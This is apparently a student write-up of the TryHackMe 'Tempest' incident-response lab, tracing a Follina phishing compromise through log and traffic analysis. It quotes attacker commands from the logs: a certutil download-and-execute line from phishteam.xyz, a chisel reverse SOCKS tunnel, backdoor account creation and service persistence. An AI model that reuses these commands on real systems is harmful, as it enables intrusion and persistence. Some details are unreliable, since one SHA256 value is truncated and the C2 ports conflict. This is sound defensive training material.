#1. Introduction

Report Introduction - Defending the Tempest: SOC Log Analysis and Incident Response.

This report documents the investigation and forensic analysis conducted in the Tempest challenge, part of the SOC Level 1 Capstone Challenges module of TryHackMe. The main objective of this exercise is to simulate a real Incident Response (IR) investigation, analyzing the complete attack chain executed against a compromised workstation.
As a member of the Incident Response team, the mission consisted of examining the artifacts collected from the affected asset—including endpoint logs and network traffic captures—in order to reconstruct the chronology of events, identify the origin of the threat, the vectors of compromise, and the extent of the malicious actions performed by the attacker.


1.1 Scope and Environment of Investigation
The analysis was conducted directly in a controlled environment based on the meticulously correlated examination of network and system data.
Affected Asset: Tempest workstation (Windows operating system).
Scope of Analysis: Forensic investigation of endpoint logs and network traffic logs generated during the incident.


1.2 Tools and Technologies Applied.
Endpoint Log Analysis: Windows Event Logs and Sysmon (for identifying process creation, persistence, and suspicious connections).
Network Traffic Analysis: Wireshark (operations and detailed packet inspection) and Brim (rapid triage of data flows and network alerts).



2. Development.

2.1 Preparation - Tools and artefacts.
Task 1: Artefact Preparation and Integrity Verification

Before launching the investigation, it is critical in digital forensics to prepare the environment and verify the integrity of all collected evidence. Verifying files via cryptographic hashes ensures the artefacts have not been altered or corrupted during acquisition or analysis, guaranteeing data authenticity throughout the Incident Response lifecycle.

Artefact Hash Verification: Using PowerShell, SHA-256 hashes were generated for all evidence files stored in C:\Users\user\Desktop\Incident Files\ via the Get-FileHash cmdlet:
Command Executed: Get-FileHash -Algorithm SHA256 .\*.*
Objective: Establish a baseline hash for each artefact to guarantee data integrity prior to analysis.

    Artefact File: capture.pcapng
    Type / Description: Network Packet Capture
    SHA-256 Hash Value:
    CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
    
    Artefact File: sysmon.evtx
    Type Description: Sysmon Event Logs
    SHA-256 Hash Value:
    665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F
    
    Artefact File: windows.evtx
    Type Description: Windows Event Logs
    SHA-256 Hash Value:
    D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

<img width="603" height="244" alt="Screen Shot 2026-08-24 at 17 14 09" src="https://github.com/user-attachments/assets/844ba6d9-100a-4b36-b1d4-c975702e9417" />

2.2 Toolset Overview & Log Parsing Execution.

To process the forensic evidence effectively, a dedicated suite of endpoint and network analysis tools was deployed. Specialized utilities from Eric Zimmerman's EZTools suite were leveraged to convert raw Event Logs into easily filterable structured data.

Endpoint Analysis Suite: EvtxEcmd, Timeline Explorer, SysmonView, Event Viewer.
Network Analysis Suite: Wireshark, Brim.

EVTX Log Parsing with EvtxEcmd & Timeline Explorer

Raw Windows Event Logs (.evtx) were parsed into CSV format to enable rapid filtering, sorting, and timeline analysis within Timeline Explorer.

EvtxEcmd Execution:
Command Executed: .\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
Result: Successfully parsed 2,559 event log records from sysmon.evtx into sysmon.csv in 14.52 seconds.

Parsed Event Metrics:

      - Event ID 1 (Process Creation): 238
      - Event ID 3 (Network Connection): 92
      - Event ID 11 (File Created): 1,024
      - Event ID 12/13 (Registry Object/Value Modifications): 1,055
      - Event ID 22 (DNSEvent): 136

<img width="603" height="415" alt="Screen Shot 2026-08-24 at 17 21 17" src="https://github.com/user-attachments/assets/b7dc4322-b047-4ad3-9bcb-d1eb7b792e28" />

2.3 Data Loading into Timeline Explorer:

The generated sysmon.csv file was loaded directly into Timeline Explorer v2.0.0.1 to review timestamps, Event Record IDs, Provider types, and specific payload details.

<img width="603" height="209" alt="Screen Shot 2026-08-24 at 17 24 51" src="https://github.com/user-attachments/assets/8361a52b-d48f-4f50-aa9b-24e3f558cb45" />

2.4 Initial Access - Malicious Document.

Task 2: Incident Analysis & Findings

Following a critical alert triaged by the SOC, an investigation was launched into an endpoint compromise initiated by a malicious Word document downloaded via Google Chrome. The analysis was performed by parsing Sysmon logs into CSV format with EvtxEcmd and investigating the output through Timeline Explorer.

What is the file name of the malicious document?

    Objective: Identify the malicious .doc file downloaded by the victim.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: A search was executed for the .doc extension within the parsed Sysmon logs. Filtering for file creation events associated with chrome.exe revealed the target file saved directly into the user's Downloads directory.
    Response: free_magicules.doc

<img width="603" height="307" alt="Screen Shot 2026-08-24 at 17 26 38" src="https://github.com/user-attachments/assets/59e2b92b-e2a5-40d2-b530-cc2056bd3dca" />

What is the name of the compromised user and machine?

    Objective: Identify the victim's account name and hostname.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Examining the User Name and Payload Data3 columns across events linked to the malicious document execution revealed the domain/user format and host details.
    Response: TEMPEST\benimaru (User: benimaru | Machine: TEMPEST)

<img width="603" height="256" alt="Screen Shot 2026-08-24 at 17 27 23" src="https://github.com/user-attachments/assets/f305a220-b4bb-41c5-ad3b-0847166271de" />

What is the PID of the Microsoft Word process that opened the malicious document?

    Objective: Determine the Process ID (PID) of WINWORD.EXE executing the payload.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: By filtering for Process Creation (Event ID 1) events involving free_magicules.doc and Microsoft Word (WINWORD.EXE), the system recorded Process ID 496 executing the file.
    Response: 496

<img width="603" height="151" alt="Screen Shot 2026-08-24 at 17 29 19" src="https://github.com/user-attachments/assets/cb2d3146-3ac3-4e11-b58d-25f96b530f50" />

Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain?

    Objective: Identify the remote IP address linked to the malicious domain (phishteam.xyz).
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Filtering for DNS Query events (Event ID 22) involving phishteam.xyz showed DNS resolution details in the QueryResults field.
    Response: 167.71.199.191

<img width="603" height="255" alt="Screen Shot 2026-08-24 at 17 30 15" src="https://github.com/user-attachments/assets/4651567c-2624-4655-ba8a-cf3e60da26cb" />

What is the base64 encoded string in the malicious payload executed by the document?

    Objective: Extract the obfuscated Base64 string embedded in the executed payload command.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Inspecting the process creation arguments for msdt.exe invoked by Microsoft Word revealed a PowerShell inline script using [System.Convert]::FromBase64String().
    Response: JGFwcD1RW52aXJvb... (Truncated Base64 string as extracted from cell contents)

<img width="603" height="195" alt="Screen Shot 2026-08-24 at 17 31 24" src="https://github.com/user-attachments/assets/4371b61c-4591-4337-b2b2-ee4c55f6e17f" />

What is the CVE number of the exploit used by the attacker to achieve remote code 
execution?

    Objective: Correlate the observed command structure with known public vulnerabilities.
    Tool Used: External Threat Intelligence Research
    Analysis & Methodology: The command leverages msdt.exe (Microsoft Support Diagnostic Tool) via the ms-msdt: URI scheme to bypass macro controls and achieve Remote Code Execution. External research confirms this signature belongs to the "Follina" vulnerability.
    Response: CVE-2022-30190

<img width="603" height="347" alt="Screen Shot 2026-08-24 at 17 32 06" src="https://github.com/user-attachments/assets/1df6ecba-afac-4c73-863c-9535acedae2f" />

2.5 Initial Access - Stage 2 execution.

Task 3: Stage 2 Payload Analysis & Persistence Investigation

Decoding the obfuscated Base64 string from the Follina exploit revealed the secondary execution chain. The attacker established persistence using the Windows Startup folder and retrieved a secondary stage executable (first.exe) via certutil.exe to establish a Command and Control (C2) channel.

<img width="603" height="255" alt="Screen Shot 2026-08-24 at 17 32 43" src="https://github.com/user-attachments/assets/f5fd0bf6-a390-4bfc-b779-5a8f8b4d4103" />

The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?

    Objective: Identify the local filesystem path where the Stage 2 payload was written.
    Tool Used: CyberChef / Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Decoding the Base64 string in CyberChef revealed a PowerShell command targeting the user's Startup directory ($app\Microsoft\Windows\Start Menu\Programs\Startup) to download and extract update.zip. Subsequent Sysmon logs confirmed certutil.exe saved the primary executable to the public downloads directory.
    Response: C:\Users\Public\Downloads\first.exe

<img width="603" height="291" alt="Screen Shot 2026-08-24 at 17 33 22" src="https://github.com/user-attachments/assets/3e35deed-7146-47c4-b9d8-ce78418715d5" />

The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

    Objective: Determine the command line initiated upon user authentication.
    Tool Used: CyberChef / Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Decoding the payload string exposed the inline script executing via PowerShell: certutil -urlcache -split -f '[http://phishteam.xyz/02dcf07/first.exe] (http://phishteam.xyz/02dcf07/first.exe)' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe.
    Response: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f '[http://phishteam.xyz/02dcf07/first.exe](http://phishteam.xyz/02dcf07/first.exe)' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe

<img width="603" height="129" alt="Screen Shot 2026-08-24 at 17 34 19" src="https://github.com/user-attachments/assets/b7265d55-9398-43dd-ba37-44b1666e61f9" />

Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?

    Objective: Obtain the SHA256 hash of first.exe for threat intelligence matching.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Filtering Sysmon process creation and file creation events for first.exe (executed by PowerShell) isolated the hash metadata in the Payload Data3 column.
    Response: CE278CA242AA2023A4FE03630A9D3B6 (SHA256 from Sysmon record)

<img width="603" height="125" alt="Screen Shot 2026-08-24 at 17 35 11" src="https://github.com/user-attachments/assets/106b5988-a7d4-4f55-9cf0-62e3e3aa6c85" />

The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?

    Objective: Identify the C2 domain and port utilized by first.exe.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Tracking network and DNS events (Event ID 22) spawned by ParentProcess: C:\Users\Public\Downloads\first.exe revealed DNS queries to resolvecyber.xyz over the standard HTTP port.
    Response: resolvecyber.xyz:80

<img width="603" height="234" alt="Screen Shot 2026-08-24 at 17 35 43" src="https://github.com/user-attachments/assets/6d670cc9-707d-449b-a11c-7304cfdc9b88" />

<img width="603" height="181" alt="Screen Shot 2026-08-24 at 17 36 04" src="https://github.com/user-attachments/assets/459d5161-9c3e-4a56-8450-ed98c7c60d64" />

<img width="603" height="86" alt="Screen Shot 2026-08-24 at 17 36 26" src="https://github.com/user-attachments/assets/ff4164b4-5288-444b-bcc9-a77ac9e36918" />

2.6 Initial Access - Malicious document traffic

Task 4: Network Traffic Analysis & C2 Communication Investigation

Following the discovery of external domains and IPs from endpoint logs, packet capture (capture.pcapng) analysis was conducted using Brim to inspect HTTP traffic associated with phishteam.xyz and resolvecyber.xyz. This identified the initial web payload delivery mechanisms, command execution parameters, and C2 interaction behaviors.

What is the URL of the malicious payload embedded in the document?

    Objective: Locate the exact HTTP path used to retrieve the primary payload hosted on phishteam.xyz.
    Tool Used: Brim (capture.pcapng)
    Analysis & Methodology: Executed the filter _path=="http" "phishteam" GET in Brim to review all HTTP GET requests originating from Microsoft Office User-Agents (Mozilla/4.0 (compatible; ms-office; MSOffice 16)). The initial request targeted the index file housing the exploit payload.
    Response: [http://phishteam.xyz/02dcf07/index.html]

<img width="603" height="270" alt="Screen Shot 2026-08-24 at 17 37 09" src="https://github.com/user-attachments/assets/dde07eef-3171-4fda-9ef5-f8a5ad9c4481" />

What is the encoding used by the attacker on the c2 connection?

    Objective: Determine the encoding technique applied to query parameters sent to the C2 domain resolvecyber.xyz.
    Tool Used: Brim (capture.pcapng)
    Analysis & Methodology: Investigating HTTP requests to resolvecyber.xyz revealed query strings appended to the /9ab62b5 endpoint (?q=bmV0IGx2Y2...). Decoding the string structure confirms Base64 encoding used for data exfiltration and parameter transmission.
    Response: Base64

<img width="603" height="266" alt="Screen Shot 2026-08-24 at 17 38 02" src="https://github.com/user-attachments/assets/b49b39e4-69a7-410a-b5d6-068748e35056" />

<img width="603" height="295" alt="Screen Shot 2026-08-24 at 17 38 31" src="https://github.com/user-attachments/assets/79361dd8-37da-46b9-8716-99dc0aaba19c" />

The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

    Objective: Identify the HTTP GET parameter used by first.exe to transmit command output back to the server.
    Tool Used: Brim (capture.pcapng)
    Analysis & Methodology: Filtering for HTTP transactions towards resolvecyber.xyz showed outbound requests structured with a key-value parameter in the URI schema (/9ab62b5?q=...). The binary passes encoded execution results via the q parameter.
    Response: q

<img width="603" height="203" alt="Screen Shot 2026-08-24 at 17 39 09" src="https://github.com/user-attachments/assets/28b6c77d-cbb2-4e87-bd7b-76db69d02875" />

The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

    Objective: Identify the base URL endpoint polled by the C2 binary to retrieve incoming commands.
    Tool Used: Brim (capture.pcapng)
    Analysis & Methodology: Analyzing recurring HTTP traffic to resolvecyber.xyz:8080 isolated requests made without query parameters, representing beaconing/polling endpoints where instructions are served.
    Response: ([http://resolvecyber.xyz/9ab62b5])

<img width="600" height="478" alt="Screen Shot 2026-08-24 at 17 39 58" src="https://github.com/user-attachments/assets/f3db5a1a-b0bd-4fb3-8965-cb85758c8aaf" />

What is the HTTP method used by the binary?

    Objective: Verify the HTTP verb leveraged for C2 communication.
    Tool Used: Brim (capture.pcapng)
    Analysis & Methodology: Reviewing the method field across all logged transactions for resolvecyber.xyz confirmed exclusively standard HTTP read operations.
    Response: GET

<img width="600" height="284" alt="Screen Shot 2026-08-24 at 17 40 31" src="https://github.com/user-attachments/assets/105efb5e-3aea-4529-a3f9-6e16261b0780" />

Based on the user agent, what programming language was used by the attacker to compile the binary?

    Objective: Deduce the compiler/language used to create first.exe via User-Agent inspection.
    Tool Used: Brim (capture.pcapng)
    Analysis & Methodology: Inspecting the user_agent field in the HTTP header for traffic generated by first.exe revealed the string Nim httpclient/1.6.6. This indicates the payload was authored and compiled using the Nim programming language.
    Response: Nim

<img width="600" height="273" alt="Screen Shot 2026-08-24 at 17 41 08" src="https://github.com/user-attachments/assets/1f038725-5967-4531-885d-26b1cdb00f1b" />

2.7 Discovery - Internal Reconnaissance


Task 5: Internal Reconnaissance & Lateral Movement Investigation

Analysis of post-exploitation HTTP traffic and Sysmon process execution logs exposed the attacker's internal enumeration commands, credential harvesting, deployment of a reverse SOCKS proxy, and subsequent authentication via administrative remote management protocols.

The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?

    Objective: Extract plaintext credentials gathered during file system discovery.
    Tool Used: CyberChef / Brim
    Analysis & Methodology: Decoding the Base64-encoded command outputs captured in C2 traffic revealed the execution of cat C:\Users\Benimaru\Desktop\automation.ps1. The script contained hardcoded domain credentials for user TEMPEST\benimaru.
    Response: infernotempest

<img width="600" height="229" alt="Screen Shot 2026-08-24 at 17 47 48" src="https://github.com/user-attachments/assets/4ff47d66-da8a-4684-a4fe-f59197f7013a" />

<img width="600" height="229" alt="Screen Shot 2026-08-24 at 17 48 08" src="https://github.com/user-attachments/assets/9aca9e78-08da-4115-a50d-7d0e87cb3077" />

The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?

    Objective: Identify the listening service targeted for remote administrative access.
    Tool Used: CyberChef / Network Reconnaissance Output
    Analysis & Methodology: Base64 output of netstat -ano -p tcp showed port 5985 active and listening (0.0.0.0:5985). Port 5985 hosts Windows Remote Management (WinRM), allowing interactive remote PowerShell access.
    Response: 5985

<img width="600" height="265" alt="Screen Shot 2026-08-24 at 17 48 38" src="https://github.com/user-attachments/assets/903b7a76-ab01-4baa-835e-9624cbcd8018" />

<img width="600" height="265" alt="Screen Shot 2026-08-24 at 17 49 34" src="https://github.com/user-attachments/assets/4297fc80-dab4-4f4c-b6f7-f1b6dd1040af" />

The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?

    Objective: Extract the exact binary invocation command used to launch the proxy connection.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Sysmon process creation logs recorded ch.exe being invoked with arguments specifying client proxy mode to direct internal traffic back to the attacker's IP.
    Response: "C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks

<img width="600" height="102" alt="Screen Shot 2026-08-24 at 17 50 09" src="https://github.com/user-attachments/assets/eca8e58f-0213-411a-8358-97d227f4fa31" />


What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?

    Objective: Retrieve the SHA256 hash of ch.exe from event metadata.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Inspecting the file hashes recorded for the ch.exe execution in Sysmon isolated the complete SHA256 string.
    Response: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451

<img width="604" height="124" alt="Screen Shot 2026-08-24 at 17 50 42" src="https://github.com/user-attachments/assets/2368b634-f370-4a58-86cb-e1592f0704cb" />

What is the name of the tool used by the attacker based on the SHA256 hash?

    Objective: Identify the public tunneling tool matching the payload hash.
    Tool Used: VirusTotal
    Analysis & Methodology: Searching the hash on VirusTotal correlated the binary aliases (chisel.exe, chisel_windows.exe, ch.exe) to the fast TCP/UDP tunnel utility.
    Response: chisel

<img width="604" height="373" alt="Screen Shot 2026-08-24 at 17 51 11" src="https://github.com/user-attachments/assets/b9cefa6a-4cab-465a-b88d-83c239cecc59" />

The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?

    Objective: Determine the administrative service authenticated immediately after proxy establishment.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Sysmon logged the spawning of C:\Windows\system32\wsmprovhost.exe -Embedding immediately following the proxy initialization. wsmprovhost.exe serves as the host process for Windows Remote Management (WinRM) plugins.
    Response: WinRM

<img width="604" height="355" alt="Screen Shot 2026-08-24 at 17 51 46" src="https://github.com/user-attachments/assets/daedb86e-aa28-4bae-8bb3-2b97fda7ab5a" />


2.8 Privilege Escalation - Exploiting Privileges

Task 6: Privilege Escalation Investigation

Following initial compromise and lateral movement via WinRM, the attacker performed local privilege enumeration (whoami /priv) and retrieved an exploitation utility (spf.exe) to perform token impersonation. This elevated access enabled the execution of an elevated secondary C2 binary (final.exe) communicating over an alternate port.

After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?

    Objective: Identify the privilege escalation binary filename and its SHA256 hash.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Sysmon process logs showed PowerShell downloading and saving spf.exe. Inspecting the corresponding file hash in Sysmon revealed the exact SHA256 digest.
    Response: Name: spf.exe SHA256: 8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D

<img width="604" height="182" alt="Screen Shot 2026-08-24 at 17 52 44" src="https://github.com/user-attachments/assets/9d8154ee-8193-45b2-886e-e2e569e30060" />
<img width="604" height="152" alt="Screen Shot 2026-08-24 at 17 52 31" src="https://github.com/user-attachments/assets/f72d5477-db78-4abb-b088-e8fb56d02b6a" />

Based on the SHA256 hash of the binary, what is the name of the tool used?

    Objective: Map the hash of spf.exe to its known tool name.
    Tool Used: VirusTotal
    Analysis & Methodology: Submitting the hash 8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d to VirusTotal identified the binary under its original name, PrintSpoofer64.exe.
    Response: PrintSpoofer (or PrintSpoofer64.exe)

<img width="604" height="137" alt="Screen Shot 2026-08-24 at 17 53 18" src="https://github.com/user-attachments/assets/9801def3-f2b0-440c-b196-b63eb7363201" />

The tool exploits a specific privilege owned by the user. What is the name of the privilege?

    Objective: Determine the Windows privilege targeted by PrintSpoofer for privilege escalation.
    Tool Used: Process Execution / Knowledge Base
    Analysis & Methodology: PrintSpoofer abuses token impersonation rights assigned to service/local accounts by tricking the Print Spooler service to write to a named pipe, stealing and duplicating the NT AUTHORITY\SYSTEM token.
    Response: SeImpersonatePrivilege

<img width="604" height="232" alt="Screen Shot 2026-08-24 at 17 53 52" src="https://github.com/user-attachments/assets/0a3a0a00-de0e-40d6-be4b-4c57ce37de7d" />

Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?

    Objective: Identify the payload binary executed under elevated SYSTEM privileges.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Checking process creation parameters for spf.exe showed the execution line: C:\Users\benimaru\Downloads\spf.exe -c C:\ProgramData\final.exe.
    Response: final.exe

<img width="604" height="139" alt="Screen Shot 2026-08-24 at 17 54 33" src="https://github.com/user-attachments/assets/395a7fd1-8043-415b-a180-a84bfdc3b566" />

The binary connects to a different port from the first c2 connection. What is the port used?

    Objective: Identify the updated destination port for the elevated C2 connection.
    Tool Used: Brim (capture.pcapng)
    Analysis & Methodology: Filtering HTTP traffic directed at resolvecyber.xyz in Brim revealed that initial connections operated over port 80, whereas subsequent traffic from final.exe shifted destination requests to port 8080 (id.resp_p == 8080).
    Response: 8080

<img width="604" height="173" alt="Screen Shot 2026-08-24 at 17 55 05" src="https://github.com/user-attachments/assets/4d611ceb-903a-4bd0-803c-3c06cb2baa3a" />

2.9 Actions on Objective - Fully Owned Machine

Task 7: Fully-Owned Machine Investigation

Analysis of post-privilege escalation activity via Sysmon process logs and Windows Event Logs revealed account creation attempts, administrative group modification, and persistence establishment via a custom Windows Service.

Upon achieving SYSTEM access, the attacker then created two users. What are the account names?

    Objective: Identify local accounts created by the threat actor following privilege escalation.
    Tool Used: Timeline Explorer (sysmon.csv / windows.csv)
    Analysis & Methodology: Event ID 4720 records show new accounts created under the target names shion and shuna.
    Response: shion, shuna

<img width="602" height="100" alt="Screen Shot 2026-08-24 at 17 55 48" src="https://github.com/user-attachments/assets/a97c2c26-19f4-4a60-8e1f-eefc9d470c79" />

Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?

    Objective: Identify the missing syntax parameter causing initial execution failure.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Initial commands were executed as net user shuna princess instead of including the /add switch required by net.exe syntax (net user /add shuna ...).
    Response: /add

<img width="602" height="228" alt="Screen Shot 2026-08-24 at 17 56 20" src="https://github.com/user-attachments/assets/ece154f6-3f16-4ac8-87b3-cf9457a31cd6" />

<img width="602" height="146" alt="Screen Shot 2026-08-24 at 17 56 37" src="https://github.com/user-attachments/assets/86a1efad-f188-4f79-bef6-adfdb476b4ab" />

Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?

    Objective: Identify the standard Security Event ID for account creation.
    Tool Used: Windows Security Event Log / Timeline Explorer
    Analysis & Methodology: Filtering Windows Security Event Logs isolates Event ID 4720 ("A user account was created").
    Response: 4720

<img width="602" height="182" alt="Screen Shot 2026-08-24 at 17 57 14" src="https://github.com/user-attachments/assets/c3ed0735-fbfc-407e-a10c-18e0b9c810c2" />

<img width="602" height="316" alt="Screen Shot 2026-08-24 at 17 57 35" src="https://github.com/user-attachments/assets/1af17fe4-e886-409d-9adf-03c3c8e24547" />

<img width="602" height="239" alt="Screen Shot 2026-08-24 at 17 57 55" src="https://github.com/user-attachments/assets/6d33475f-a662-4f47-9ca7-ce0219f5f67f" />

The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?

    Objective: Extract the exact command used to add a user to Administrators.
    Tool Used: Timeline Explorer (sysmon.csv) / CyberChef Base64 Decode
    Analysis & Methodology: Executed command-line logging captured net localgroup administrators /add shion.
    Response: net localgroup administrators /add shion

<img width="602" height="261" alt="Screen Shot 2026-08-24 at 17 58 26" src="https://github.com/user-attachments/assets/d19f34b7-4bb2-4538-a272-9da9ce4a1542" />

Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?

    Objective: Identify the Event ID associated with local security group membership changes.
    Tool Used: Windows Security Event Log / Knowledge Base
    Analysis & Methodology: Windows Event ID 4732 ("A member was added to a security-enabled local group") records additions to privileged local groups.
    Response: 4732

<img width="602" height="270" alt="Screen Shot 2026-08-24 at 17 59 02" src="https://github.com/user-attachments/assets/75d33c7d-6b27-47f2-bd16-ba41b1ace091" />

After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?

    Objective: Extract the command string used to establish persistence via Windows Services.
    Tool Used: Timeline Explorer (sysmon.csv)
    Analysis & Methodology: Sysmon logged sc.exe creating a new auto-starting system service pointing to the secondary C2 binary: C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto.
    Response: C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto

<img width="602" height="232" alt="Screen Shot 2026-08-24 at 17 59 39" src="https://github.com/user-attachments/assets/0cd08617-82e0-4efa-b30d-09bf143a13ce" />

3. Conclusion

3.1 How did the attacker gain initial access?
The initial access vector used by the attacker was a targeted phishing campaign:

Document Download: The user downloaded a malicious Microsoft Word document titled free_magicules.doc via Google Chrome.


Vulnerability Exploitation (Follina): Upon opening the file with Microsoft Word (WINWORD.EXE, running under PID 496), the document triggered the Remote Code Execution (RCE) vulnerability exploit known as Follina (CVE-2022-30190). This flaw abuses the ms-msdt: protocol handler, utilizing the legitimate Windows utility msdt.exe to bypass macro execution restrictions.



Payload Execution: The msdt.exe utility executed a PowerShell command containing a Base64-obfuscated string. Once decoded, the instruction revealed a command that used the certutil.exe utility to download a second-stage malicious binary (first.exe) hosted on the domain phishteam.xyz.


3.2 Which endpoint was compromised first?
The primary compromised endpoint was the Windows workstation named TEMPEST, directly impacting the local domain user account TEMPEST\benimaru.

3.3 Which credentials were used or compromised?

Benimaru's Credentials: During the file system discovery phase, the attacker located a sensitive script on the user's desktop named C:\Users\Benimaru\Desktop\automation.ps1.


Exposed Password: The script contained the credentials for user TEMPEST\benimaru exposed in cleartext, revealing the password infernotempest.


Utilization: The attacker used this legitimate password to administratively authenticate to the endpoint via the Windows Remote Management (WinRM) service on port 5985.


3.4 Was there execution of PowerShell, Bash, or other Living-off-the-Land techniques?
Yes. The attacker heavily utilized Living-off-the-Land (LotL) techniques, abusing legitimate Windows system utilities to evade traditional security tools:

msdt.exe (Microsoft Support Diagnostic Tool): Abused via the ms-msdt: protocol to invoke the command interpreter without triggering macro alerts.


PowerShell (powershell.exe): Used to execute embedded Base64-obfuscated scripts, download additional tools, and query account privileges.


certutil.exe: Administrative tool used with the parameters -urlcache -split -f to download external malicious artifacts, bypassing standard network controls.


netstat.exe: Executed (netstat -ano -p tcp) to map active connections and listening ports on the machine.



whoami.exe: Abused with the /priv flag to audit local privileges of the current account.


wsmprovhost.exe: Legitimate system process spawned on the system to host the remote PowerShell session initiated by the attacker via WinRM.


net.exe (and net1.exe): Used for creating local accounts (net user) and manipulating local security groups.


sc.exe (Service Control): Used to register a persistent system service.


3.5 Did the adversary perform lateral movement?
There was no compromise of other internal machines on the network described within the scope, but the attacker performed remote administrative access (lateral movement of control) back into the TEMPEST machine itself in an evasive manner:

The attacker deployed the Chisel tunneling tool (saved as ch.exe) to establish a reverse SOCKS proxy that directed internal network traffic back to the attacker's IP (167.71.199.191:8080).


With the SOCKS channel established and the cleartext credentials mined (infernotempest), the attacker connected from the outside in using the administrative WinRM protocol (port 5985), gaining an interactive command shell.


3.6 What artifacts remain on the compromised systems?
The following malicious artifacts were persisted or left on the machine and must be cleaned up:

Malicious Files and Binaries:

The vector document: C:\Users\benimaru\Downloads\free_magicules.doc


The primary C2 (Nim): C:\Users\Public\Downloads\first.exe (SHA256: CE278CA242AA2023A4FE03630A9D3B6)


The Chisel executable: C:\Users\benimaru\Downloads\ch.exe (SHA256: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451)

The PrintSpoofer utility: C:\Users\benimaru\Downloads\spf.exe (SHA256: 8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D)


The elevated secondary C2 (SYSTEM): C:\ProgramData\final.exe


Possible remnants of the download/extraction script for the compressed file update.zip in the user's Startup directory.


System Persistence and Accounts:

An auto-start Windows service named TempestUpdate2, configured to point directly to C:\ProgramData\final.exe.


Fraududently created user accounts: shuna and shion.


Association of the shion account with the local Administrators group.


3.7 What evidence needs to be preserved?
For forensic integrity and chain of custody purposes, the following original evidence files must be preserved along with their respective SHA-256 hashes:

Network Traffic: capture.pcapng (SHA-256: CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6)


Sysmon Logs: sysmon.evtx (SHA-256: 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F)


Windows Event Logs: windows.evtx (SHA-256: D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60)


Endpoint Files: The original automation.ps1 script on the desktop (containing the exposed credentials) and all copies of the attack binaries listed in the previous item for reverse engineering analysis.


3.8 What actually happened during the incident? (Timeline)
The attack against host TEMPEST followed a structured intrusion chain (Cyber Kill Chain):

Initial Compromise: User benimaru executed the file free_magicules.doc. Leveraging the Follina vulnerability, Microsoft Word invoked msdt.exe to run a hidden PowerShell command that used certutil.exe to download the C2 agent first.exe from the malicious domain phishteam.xyz.


Stage 2 C2: The first.exe binary (developed in the Nim programming language) established communications over port 80 with the C2 server at resolvecyber.xyz. It sent the output of executed commands back to the server in Base64-encoded format via the q URL parameter.


Credential Theft and Tunneling: The attacker conducted local discovery on the system and read the file C:\Users\Benimaru\Desktop\automation.ps1, discovering the cleartext password infernotempest. To administratively access the host from outside the network, the attacker initiated a SOCKS reverse proxy using Chisel (ch.exe) directed to the attacker's IP.


WinRM Login: Through Chisel's encrypted channel, the attacker used benimaru's harvested credentials to authenticate to the machine's WinRM service (port 5985), which spawned the wsmprovhost.exe process.


